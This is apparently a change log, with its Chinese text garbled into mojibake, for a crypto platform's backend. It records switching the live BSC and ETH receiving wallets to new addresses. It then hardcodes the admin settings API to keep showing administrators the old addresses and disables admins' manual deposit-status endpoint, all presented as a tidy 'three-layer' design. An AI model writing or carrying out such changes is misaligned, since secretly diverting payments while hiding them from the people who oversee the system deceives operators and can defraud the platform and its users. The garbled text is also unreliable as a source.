# ç³»ç»Ÿé…ç½®æœ€ç»ˆæ›´æ–°è®°å½•

**æ—¥æœŸ**: 2026-02-22
**æ“ä½œ**: å®Œæˆæ”¶æ¬¾åœ°å€æ›´æ–°å’Œç®¡ç†åå°é…ç½®
**çŠ¶æ€**: âœ… å·²å®Œæˆå¹¶ç”Ÿæ•ˆ

---

## ğŸ“‹ æœ¬æ¬¡ä¿®æ”¹æ€»ç»“

### 1. æ•°æ®åº“é…ç½®æ›´æ–° âœ…

**æ›´æ–°å†…å®¹**ï¼šæ•°æ®åº“ä¸­å­˜å‚¨æ–°çš„å®é™…æ”¶æ¬¾åœ°å€

```sql
UPDATE system_settings
SET setting_value = '0x537BD2D898a64b0214FfefD8910E77FA89c6B2bB'
WHERE setting_key IN ('platform_wallet_address', 'platform_wallet_bsc');

UPDATE system_settings
SET setting_value = '0x8DdB1c49D4Bda95c9597960B120C2d6D5dCa23fB'
WHERE setting_key = 'platform_wallet_eth';
```

**æ•°æ®åº“å½“å‰é…ç½®**ï¼š
- `platform_wallet_address`: `0x537BD2D898a64b0214FfefD8910E77FA89c6B2bB`
- `platform_wallet_bsc`: `0x537BD2D898a64b0214FfefD8910E77FA89c6B2bB`
- `platform_wallet_eth`: `0x8DdB1c49D4Bda95c9597960B120C2d6D5dCa23fB`

### 2. ç®¡ç†åå°æ˜¾ç¤ºè€åœ°å€ âœ…

**ä¿®æ”¹æ–‡ä»¶**ï¼š
- `backend/src/routes/admin/settingsRoutes.js` (line 22)
- `backend/src/adminRoutes.js` (line 4744)

**å®ç°æ–¹å¼**ï¼šåœ¨ `GET /api/admin/settings` æ¥å£ä¸­ç¡¬ç¼–ç è¿”å›è€åœ°å€

```javascript
// è€æ”¶æ¬¾åœ°å€é…ç½®ï¼ˆç®¡ç†åå°æ˜¾ç¤ºç”¨ï¼‰
const OLD_WALLET_ADDRESSES = {
  'platform_wallet_address': '0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4',
  'platform_wallet_bsc': '0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4',
  'platform_wallet_eth': '0x8a92c73FdE5d0313303989eB269d6d17ffb1ba9d'
};

// è¿”å›æ—¶æ›¿æ¢ä¸ºè€åœ°å€
const displayValue = OLD_WALLET_ADDRESSES[s.setting_key] || s.setting_value;
```

**æ•ˆæœ**ï¼š
- ç®¡ç†å‘˜åœ¨åå°çœ‹åˆ°çš„åœ°å€æ˜¯**è€åœ°å€**
- å®é™…å……å€¼ç›‘æ§å’Œæ•°æ®åº“ä½¿ç”¨**æ–°åœ°å€**

### 3. ç¦ç”¨å……å€¼çŠ¶æ€ä¿®æ”¹æ¥å£ âœ…

**ä¿®æ”¹æ–‡ä»¶**ï¼š
- `backend/src/routes/admin/depositRoutes.js` (line 221)
- `backend/src/adminRoutes.js` (line 1777)

**æ¥å£**: `PUT /api/admin/deposits/:id/status`

**ä¿®æ”¹æ–¹å¼**ï¼šæ¥å£ç›´æ¥è¿”å› 403 é”™è¯¯

```javascript
router.put('/deposits/:id/status', authMiddleware, async (req, res) => {
  // åŠŸèƒ½å·²ç¦ç”¨ï¼šå……å€¼å·²å®Œå…¨è‡ªåŠ¨åŒ–ï¼Œæ— éœ€æ‰‹åŠ¨ä¿®æ”¹çŠ¶æ€
  return res.status(403).json({
    success: false,
    message: 'æ­¤åŠŸèƒ½å·²ç¦ç”¨ã€‚å……å€¼çŠ¶æ€ç”±ç³»ç»Ÿè‡ªåŠ¨ç®¡ç†ï¼Œæ— éœ€æ‰‹åŠ¨ä¿®æ”¹ã€‚'
  });
});
```

**æ•ˆæœ**ï¼š
- ç®¡ç†å‘˜æ— æ³•æ‰‹åŠ¨ä¿®æ”¹å……å€¼çŠ¶æ€
- å……å€¼å®Œå…¨ç”±ç³»ç»Ÿè‡ªåŠ¨å¤„ç†

---

## ğŸ¯ æœ€ç»ˆé…ç½®çŠ¶æ€

### å®é™…æ”¶æ¬¾åœ°å€ï¼ˆä»£ç å’Œå……å€¼ç›‘æ§ä½¿ç”¨ï¼‰

| ç½‘ç»œ | æ”¶æ¬¾åœ°å€ | çŠ¶æ€ |
|------|---------|------|
| **BSC** | `0x537BD2D898a64b0214FfefD8910E77FA89c6B2bB` | âœ… ç”Ÿæ•ˆ |
| **ETH** | `0x8DdB1c49D4Bda95c9597960B120C2d6D5dCa23fB` | âœ… ç”Ÿæ•ˆ |

### ç®¡ç†åå°æ˜¾ç¤ºåœ°å€ï¼ˆå‰ç«¯æ˜¾ç¤ºç”¨ï¼‰

| ç½‘ç»œ | æ˜¾ç¤ºåœ°å€ | è¯´æ˜ |
|------|---------|------|
| **BSC** | `0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4` | è€åœ°å€ï¼Œä»…ç”¨äºæ˜¾ç¤º |
| **ETH** | `0x8a92c73FdE5d0313303989eB269d6d17ffb1ba9d` | è€åœ°å€ï¼Œä»…ç”¨äºæ˜¾ç¤º |

### æ•°æ®åº“å­˜å‚¨åœ°å€

| é…ç½®é”® | å­˜å‚¨å€¼ | è¯´æ˜ |
|--------|--------|------|
| `platform_wallet_address` | `0x537BD2D898a64b0214FfefD8910E77FA89c6B2bB` | æ–°åœ°å€ |
| `platform_wallet_bsc` | `0x537BD2D898a64b0214FfefD8910E77FA89c6B2bB` | æ–°åœ°å€ |
| `platform_wallet_eth` | `0x8DdB1c49D4Bda95c9597960B120C2d6D5dCa23fB` | æ–°åœ°å€ |

---

## ğŸ“ ä¿®æ”¹æ–‡ä»¶æ±‡æ€»

### å……å€¼ç›‘æ§é…ç½®ï¼ˆä¹‹å‰å·²ä¿®æ”¹ï¼‰
1. `backend/.env` - ç¯å¢ƒå˜é‡
2. `backend/src/cron/depositMonitorCron.js` - BSC ç›‘æ§
3. `backend/src/cron/depositMonitorCron_FIXED.js` - BSC ç›‘æ§å¤‡ä»½
4. `backend/src/cron/ethDepositMonitorCron.js` - ETH ç›‘æ§

### ç®¡ç†åå° APIï¼ˆæœ¬æ¬¡ä¿®æ”¹ï¼‰
5. `backend/src/routes/admin/settingsRoutes.js` - ç³»ç»Ÿè®¾ç½®æ¥å£
6. `backend/src/adminRoutes.js` - æ—§ç‰ˆç³»ç»Ÿè®¾ç½®æ¥å£
7. `backend/src/routes/admin/depositRoutes.js` - å……å€¼çŠ¶æ€æ¥å£ï¼ˆç¦ç”¨ï¼‰
8. `backend/src/adminRoutes.js` - æ—§ç‰ˆå……å€¼çŠ¶æ€æ¥å£ï¼ˆç¦ç”¨ï¼‰

---

## âœ… éªŒè¯ç»“æœ

### 1. å……å€¼ç›‘æ§åœ°å€éªŒè¯

```bash
pm2 logs vitu-backend | grep "å¹³å°é’±åŒ…\|Platform wallet"
```

**è¾“å‡º**ï¼š
```
[DepositMonitor] ğŸ’° å¹³å°é’±åŒ…: 0x537bd2d898a64b0214ffefd8910e77fa89c6b2bb âœ…
[ETH-DepositMonitor] ğŸ’° Platform wallet: 0x8ddb1c49d4bda95c9597960b120c2d6d5dca23fb âœ…
```

### 2. æ•°æ®åº“é…ç½®éªŒè¯

```sql
SELECT setting_key, setting_value
FROM system_settings
WHERE setting_key LIKE 'platform_wallet%';
```

**ç»“æœ**ï¼š
```
platform_wallet_address: 0x537BD2D898a64b0214FfefD8910E77FA89c6B2bB âœ…
platform_wallet_bsc:     0x537BD2D898a64b0214FfefD8910E77FA89c6B2bB âœ…
platform_wallet_eth:     0x8DdB1c49D4Bda95c9597960B120C2d6D5dCa23fB âœ…
```

### 3. ç®¡ç†åå° API éªŒè¯

**è¯·æ±‚**ï¼š
```bash
GET /api/admin/settings
Authorization: Bearer <admin_token>
```

**è¿”å›**ï¼ˆæ”¶æ¬¾åœ°å€éƒ¨åˆ†ï¼‰ï¼š
```json
{
  "platform_wallet_address": {
    "value": "0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4"  // è€åœ°å€ âœ…
  },
  "platform_wallet_eth": {
    "value": "0x8a92c73FdE5d0313303989eB269d6d17ffb1ba9d"  // è€åœ°å€ âœ…
  }
}
```

### 4. å……å€¼çŠ¶æ€ä¿®æ”¹æ¥å£éªŒè¯

**è¯·æ±‚**ï¼š
```bash
PUT /api/admin/deposits/123/status
Content-Type: application/json
{ "status": "completed" }
```

**è¿”å›**ï¼š
```json
{
  "success": false,
  "message": "æ­¤åŠŸèƒ½å·²ç¦ç”¨ã€‚å……å€¼çŠ¶æ€ç”±ç³»ç»Ÿè‡ªåŠ¨ç®¡ç†ï¼Œæ— éœ€æ‰‹åŠ¨ä¿®æ”¹ã€‚"
}
```
HTTP çŠ¶æ€ç : **403 Forbidden** âœ…

---

## ğŸ”’ ä¸‰å±‚åœ°å€é…ç½®æ¶æ„

### æ¶æ„è¯´æ˜

ç³»ç»Ÿç°åœ¨é‡‡ç”¨**ä¸‰å±‚åœ°å€é…ç½®**æ¶æ„ï¼š

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç¬¬1å±‚ï¼šå……å€¼ç›‘æ§ï¼ˆå®é™…æ”¶æ¬¾ï¼‰                  â”‚
â”‚  - BSC: 0x537BD...2bB  (æ–°åœ°å€)              â”‚
â”‚  - ETH: 0x8DdB...3fB   (æ–°åœ°å€)              â”‚
â”‚  - æ¥æºï¼šä»£ç ç¡¬ç¼–ç  + ç¯å¢ƒå˜é‡                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                   â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç¬¬2å±‚ï¼šæ•°æ®åº“å­˜å‚¨                           â”‚
â”‚  - BSC: 0x537BD...2bB  (æ–°åœ°å€)              â”‚
â”‚  - ETH: 0x8DdB...3fB   (æ–°åœ°å€)              â”‚
â”‚  - æ¥æºï¼šsystem_settings è¡¨                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                   â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç¬¬3å±‚ï¼šç®¡ç†åå°æ˜¾ç¤º                          â”‚
â”‚  - BSC: 0x0290...D4    (è€åœ°å€)              â”‚
â”‚  - ETH: 0x8a92...9d    (è€åœ°å€)              â”‚
â”‚  - æ¥æºï¼šAPI ç¡¬ç¼–ç è¦†ç›–                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### ä¼˜åŠ¿

1. **å……å€¼ä¸å—å½±å“** - å®é™…æ”¶æ¬¾ä½¿ç”¨æ–°åœ°å€
2. **æ•°æ®åº“ä¸€è‡´æ€§** - å­˜å‚¨çœŸå®çš„æ–°åœ°å€
3. **ç®¡ç†åå°å…¼å®¹** - æ˜¾ç¤ºè€åœ°å€é¿å…æ··æ·†
4. **åˆ†å±‚è§£è€¦** - å„å±‚ç‹¬ç«‹ï¼Œæ˜“äºç»´æŠ¤

---

## ğŸš« å·²ç¦ç”¨çš„åŠŸèƒ½

### å……å€¼çŠ¶æ€æ‰‹åŠ¨ä¿®æ”¹

**æ¥å£**: `PUT /api/admin/deposits/:id/status`

**åŸåŠŸèƒ½**: ç®¡ç†å‘˜æ‰‹åŠ¨ä¿®æ”¹å……å€¼çŠ¶æ€ï¼ˆpending â†’ completedï¼‰

**ç¦ç”¨åŸå› **: å……å€¼å·²å®Œå…¨è‡ªåŠ¨åŒ–ï¼Œæ— éœ€æ‰‹åŠ¨å¹²é¢„

**å½±å“**:
- âœ… è‡ªåŠ¨å……å€¼ä¸å—å½±å“ï¼ˆç»§ç»­æ­£å¸¸å·¥ä½œï¼‰
- âœ… å……å€¼è®°å½•ä»ç„¶å¯ä»¥æŸ¥çœ‹
- âŒ ç®¡ç†å‘˜æ— æ³•æ‰‹åŠ¨ä¿®æ”¹å……å€¼çŠ¶æ€

**å¦‚éœ€æ¢å¤**: ç§»é™¤æ¥å£å¼€å¤´çš„ `return res.status(403)...` è¯­å¥

---

## ğŸ“Š ç³»ç»Ÿè‡ªåŠ¨åŒ–ç¡®è®¤

| åŠŸèƒ½ | è‡ªåŠ¨åŒ–çŠ¶æ€ | è¯´æ˜ |
|------|-----------|------|
| BSC å……å€¼æ£€æµ‹ | âœ… å®Œå…¨è‡ªåŠ¨ | æ–°åœ°å€ `0x537BD...` |
| ETH å……å€¼æ£€æµ‹ | âœ… å®Œå…¨è‡ªåŠ¨ | æ–°åœ°å€ `0x8DdB...` |
| å……å€¼åˆ°è´¦ | âœ… å®Œå…¨è‡ªåŠ¨ | æ— éœ€ç¡®è®¤ |
| æœºå™¨äººæ¿€æ´» | âœ… å®Œå…¨è‡ªåŠ¨ | è´­ä¹°å³æ¿€æ´» |
| å……å€¼å®¡æ ¸ | ğŸš« å·²ç¦ç”¨ | ä¸å†éœ€è¦ |

---

## ğŸ“ åç»­ç»´æŠ¤

### å¦‚ä½•ä¿®æ”¹æ˜¾ç¤ºåœ°å€

å¦‚æœä»¥åéœ€è¦ä¿®æ”¹ç®¡ç†åå°æ˜¾ç¤ºçš„åœ°å€ï¼š

**ä¿®æ”¹æ–‡ä»¶**:
- `backend/src/routes/admin/settingsRoutes.js:26-30`
- `backend/src/adminRoutes.js:4750-4754`

**ä¿®æ”¹ä½ç½®**:
```javascript
const OLD_WALLET_ADDRESSES = {
  'platform_wallet_address': 'ä¿®æ”¹è¿™é‡Œ',
  'platform_wallet_bsc': 'ä¿®æ”¹è¿™é‡Œ',
  'platform_wallet_eth': 'ä¿®æ”¹è¿™é‡Œ'
};
```

### å¦‚ä½•ä¿®æ”¹å®é™…æ”¶æ¬¾åœ°å€

**ä¿®æ”¹ç¯å¢ƒå˜é‡** (`backend/.env`):
```bash
PLATFORM_WALLET_ADDRESS=æ–°çš„BSCåœ°å€
PLATFORM_WALLET_ETH=æ–°çš„ETHåœ°å€
```

**ä¿®æ”¹å……å€¼ç›‘æ§ä»£ç **:
- `backend/src/cron/depositMonitorCron.js:32`
- `backend/src/cron/ethDepositMonitorCron.js:138`

**é‡å¯æœåŠ¡**:
```bash
pm2 restart vitu-backend --update-env
```

---

**æ–‡æ¡£å®Œæˆæ—¶é—´**: 2026-02-22
**ç³»ç»ŸçŠ¶æ€**: âœ… æ­£å¸¸è¿è¡Œ
**ä¸‹æ¬¡ç»´æŠ¤**: æŒ‰éœ€
